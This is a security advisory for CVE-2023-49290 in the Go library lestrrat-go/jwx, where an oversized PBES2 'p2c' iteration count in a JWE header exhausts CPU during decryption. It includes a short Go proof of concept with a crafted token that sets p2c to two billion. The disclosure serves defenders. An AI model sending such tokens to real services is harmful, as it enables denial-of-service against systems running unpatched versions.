# [M] lestrrat-go/jwx's malicious parameters in JWE can cause a DOS

## Summary
Severity: Medium
Advisory: GHSA-7f9x-gw85-8grf
CVE: CVE-2023-49290
CWE: CWE-400
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2023-12-05
Source: https://github.com/advisories/GHSA-7f9x-gw85-8grf
Type: github-advisory

## Affected
- Go: `github.com/lestrrat-go/jwx` — affected >=0 <1.2.27
- Go: `github.com/lestrrat-go/jwx/v2` — affected >=0 <2.0.18

## Details
### Summary
too high p2c parameter in JWE's alg PBES2-* could lead to a DOS attack

### Details
The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.
Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack

### PoC
```go
package main

import (
	"fmt"
	"github.com/lestrrat-go/jwx/v2/jwa"
	"github.com/lestrrat-go/jwx/v2/jwe"
	"github.com/lestrrat-go/jwx/v2/jwk"
)

func main() {
	token := []byte("eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2R0NNIiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJNNzczSnlmV2xlX2FsSXNrc0NOTU9BIn0=.S8B1kXdIR7BM6i_TaGsgqEOxU-1Sgdakp4mHq7UVhn-_REzOiGz2gg.gU_LfzhBXtQdwYjh.9QUIS-RWkLc.m9TudmzUoCzDhHsGGfzmCA")
	key, err := jwk.FromRaw([]byte(`abcdefg`))
	payload, err := jwe.Decrypt(token, jwe.WithKey(jwa.PBES2_HS256_A128KW, key))
	if err == nil {
		fmt.Println(string(payload))
	}
}

```

### Impact
It's a kind of Dos attack, the user's environment could potentially utilize an excessive amount of CPU resources.

## References
- https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf
- https://nvd.nist.gov/vuln/detail/CVE-2023-49290
- https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c
- https://github.com/lestrrat-go/jwx
